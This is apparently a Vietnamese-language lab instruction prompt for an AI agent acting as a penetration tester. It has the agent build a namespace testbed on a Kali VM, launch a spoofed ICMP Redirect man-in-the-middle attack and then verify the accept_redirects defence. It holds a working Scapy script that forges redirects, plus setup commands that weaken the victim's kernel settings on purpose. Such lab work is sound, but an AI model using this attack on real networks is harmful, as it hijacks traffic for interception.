# WORKFLOW EXECUTION: LAB 05 - ICMP REDIRECT ATTACK (ROUTE HIJACKING / MITM)

Bạn hãy đóng vai trò là một **Senior Network Security Engineer, Routing Protocol Analyst và Penetration Tester**.

## 1. MỤC TIÊU & BỐI CẢNH KỸ THUẬT
- **Mục tiêu:** Thực thi và kiểm chứng kỹ thuật tấn công chiếm quyền định tuyến (Route Hijacking / Man-in-the-Middle) bằng gói tin ICMP Redirect giả mạo (Type 5, Code 1) trên môi trường mạng đa subnet nối qua Router ảo.
- **Cơ chế cốt lõi:** Nạn nhân (`vic` - `10.0.0.2`) ban đầu gửi lưu lượng tới mạng đích (`dst` - `10.0.1.5`) thông qua Gateway hợp pháp (`gw` - `10.0.0.1`). Kẻ tấn công cùng mạng LAN (`atk` - `10.0.0.66`) gửi một gói ICMP Redirect giả mạo địa chỉ nguồn của `gw` (`10.0.0.1`), đính kèm header của gói tin gốc mà `vic` vừa gửi đi, báo cho `vic` rằng đường đi tốt hơn tới `10.0.1.5` là qua `10.0.0.66`. Kernel của `vic` cập nhật bảng định tuyến (Routing Cache), đẩy toàn bộ lưu lượng sang máy tấn công.
- **Mục tiêu phòng thủ:** Kiểm tra điều kiện hợp lệ để Linux Kernel chấp nhận ICMP Redirect, sau đó vô hiệu hóa bằng `net.ipv4.conf.*.accept_redirects = 0`.

---

## 2. QUY TRÌNH THỰC THI CHI TIẾT (5 GIAI ĐOẠN)

### GIAI ĐOẠN 1: Chuẩn bị Script Cục bộ & Khởi tạo Topology Đa Mạng
1. Tạo thư mục `docs/progress/LAB05/scripts/` trên workspace host.
2. Tạo script `setup_redirect.sh`:
   - Dọn dẹp sạch các namespace cũ (`vic`, `gw`, `atk`, `dst`, `amp*`, `h*`) và bridge `br0` nếu còn tồn tại.
   - Tạo mạng LAN `10.0.0.0/24` qua bridge `br0` gồm 3 nút:
     - `vic`: `10.0.0.2/24` (Victim)
     - `gw`: `10.0.0.1/24` (Legitimate Gateway / Router)
     - `atk`: `10.0.0.66/24` (Attacker cùng LAN)
   - Tạo mạng đích `10.0.1.0/24` nằm sau `gw` nối với namespace `dst` qua cặp veth `gw-d <-> d-gw`:
     - Giao diện `gw-d` (trên `gw`): `10.0.1.254/24`
     - Giao diện `d-gw` (trên `dst`): `10.0.1.5/24`
   - Bật IP Forwarding trên `gw` (`net.ipv4.ip_forward=1`) và tắt tự gửi redirect trên `gw` (`net.ipv4.conf.all.send_redirects=0`).
   - Thiết lập Default Route trên `vic` trỏ về `10.0.0.1` và trên `dst` trỏ về `10.0.1.254`.
   - **Tái tạo điểm yếu trên Victim (`vic`):**
     ```bash
     for k in all default vic0; do
         ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=1
         ip netns exec vic sysctl -w net.ipv4.conf.$k.secure_redirects=0
     done
     ```
3. Tạo script tấn công `send_redirect.py`:
   - Chế tạo gói tin ICMP Redirect (Type 5, Code 1 - Host Redirect):
     ```python
     from scapy.all import IP, ICMP, send

     orig = IP(src="10.0.0.2", dst="10.0.1.5") / ICMP(id=1, seq=1)
     redir = IP(src="10.0.0.1", dst="10.0.0.2") / ICMP(type=5, code=1, gw="10.0.0.66") / orig
     send(redir, verbose=0)
     print("[+] Sent spoofed ICMP Redirect: 10.0.1.5 -> via 10.0.0.66")
     ```

### GIAI ĐOẠN 2: Triển khai lên Kali VM & Ghi nhận Baseline Route
1. Dùng `ssh_execute` tạo thư mục `/tmp/lab05` trên Kali VM, đẩy các script lên và chạy `setup_redirect.sh`.
2. Kiểm tra kết nối ban đầu từ `vic` tới `10.0.1.5`:
   ```bash
   ip netns exec vic ping -c 2 10.0.1.5
   ```
3. Ghi nhận đường đi ban đầu (Baseline Route) trên `vic`:
   ```bash
   ip netns exec vic ip route get 10.0.1.5
   ```
   Xác nhận lưu lượng đi qua `via 10.0.0.1 dev vic0`.

### GIAI ĐOẠN 3: Phát động Tấn công ICMP Redirect & Bắt Lưu lượng MITM
1. Bật IP Forwarding trên `atk` (`ip netns exec atk sysctl -w net.ipv4.ip_forward=1`) để khi lưu lượng bị bẻ lái qua `atk`, `atk` có thể chuyển tiếp hoặc quan sát rõ ràng.
2. Mở `tcpdump` trên `atk` (timeout 10 giây) để đón lõng lưu lượng từ `vic` gửi tới `10.0.1.5`:
   ```bash
   ip netns exec atk timeout 10 tcpdump -i atk0 -nn icmp and host 10.0.1.5 > /tmp/lab05/tcpdump_atk_mitm.log 2>&1 &
   ```
3. Kích hoạt luồng kết nối từ `vic` và tiêm gói ICMP Redirect giả mạo ngay lập tức:
   ```bash
   ip netns exec vic ping -c 1 10.0.1.5
   ip netns exec atk python3 /tmp/lab05/send_redirect.py
   ```
4. Kiểm tra bảng định tuyến của `vic` sau khi bị tiêm gói Redirect:
   ```bash
   ip netns exec vic ip route get 10.0.1.5
   ```
   *Kỳ vọng:* Output hiển thị `<cache: redirect> via 10.0.0.66 dev vic0`.
5. Từ `vic`, gửi tiếp 3 gói ping tới `10.0.1.5` để lưu lượng chảy qua `atk` và ghi vào log:
   ```bash
   ip netns exec vic ping -c 3 10.0.1.5
   ```

### GIAI ĐOẠN 4: Kích hoạt Phòng thủ & Kiểm chứng
1. Bật cơ chế phòng vệ trên `vic` và xóa route cache bị nhiễm độc:
   ```bash
   for k in all default vic0; do
       ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=0
   done
   ip netns exec vic ip route flush cache
   ```
2. Chạy lại bước kích hoạt ping kèm gửi `send_redirect.py`, sau đó kiểm tra lại:
   ```bash
   ip netns exec vic ip route get 10.0.1.5
   ```
   *Kỳ vọng:* Bảng định tuyến giữ nguyên `via 10.0.0.1`, hoàn toàn bỏ qua gói ICMP Redirect giả mạo.

### GIAI ĐOẠN 5: Tổng hợp Báo cáo & Dọn dẹp
1. Tạo file `docs/progress/LAB05/IMPLEMENTATION.md`: Giải thích cấu trúc gói ICMP Redirect Type 5 Code 1, lý do phải đính kèm gói IP gốc và so sánh ICMP Redirect với ARP Spoofing.
2. Tạo file `docs/progress/LAB05/lab5_result.md` theo đúng cấu trúc yêu cầu ở Mục 3 bên dưới.
3. Dọn dẹp sạch môi trường:
   ```bash
   for ns in vic gw atk dst; do ip netns del $ns 2>/dev/null || true; done
   ip link del br0 2>/dev/null || true
   rm -rf /tmp/lab05
   ```
4. Đánh dấu `[x]` cho Lab 05 trong `PLAN.md`.

---

## 3. YÊU CẦU CẤU TRÚC BÁO CÁO docs/progress/LAB05/lab5_result.md
Tệp báo cáo kết quả phải bao gồm:
- **Metadata:** Thời gian thực thi, Kernel version, Sơ đồ định tuyến 2 subnet (`10.0.0.0/24` và `10.0.1.0/24`).
- **Terminal Outputs thô (Raw Logs):** Đầy đủ output của `setup_redirect.sh`, kết quả `ip route get 10.0.1.5` trước tấn công, sau tấn công, log `tcpdump` trên `atk` bắt được lưu lượng của `vic`, và kết quả sau khi bật `accept_redirects=0`.
- **BÓC TÁCH & PHÂN TÍCH CHUYÊN SÂU LOG TERMINAL (BẮT BUỘC):**
  - **Phân tích Sự thay đổi Routing Cache:** Đối chiếu trực tiếp chuỗi output của `ip route get 10.0.1.5` trước (`via 10.0.0.1`) và sau khi tiêm gói (`<cache: redirect> via 10.0.0.66`).
  - **Giải phẫu Gói tin ICMP Redirect Hợp lệ:** Giải thích tại sao Kernel của `vic` lại tin tưởng gói tin từ `atk` (vì `atk` đã spoof `IP.src = 10.0.0.1` trùng với default gateway hiện hành của `vic`, đồng thời nhúng phần header `orig` khớp với phiên truyền thông tới `10.0.1.5`).
  - **Phân tích Log MITM trên Attacker:** Chỉ rõ các dòng log trong `tcpdump_atk_mitm.log` cho thấy gói tin từ `10.0.0.2` đi tới `10.0.1.5` đã thực sự đi vào card mạng `atk0` của kẻ tấn công.
  - **So sánh `accept_redirects=0` và `secure_redirects=1`:** Phân tích ý nghĩa của hai cờ sysctl này đối với máy trạm (host) và bộ định tuyến (router).

---

## 4. STRICT RULES
- Mọi thao tác trên Kali VM BẮT BUỘC gọi qua `kali-vm:ssh_execute`.
- Bắt buộc dùng timeout cho `tcpdump`.
- Toàn bộ dữ liệu trong `lab5_result.md` phải là kết quả thực tế trích xuất từ Kali VM.
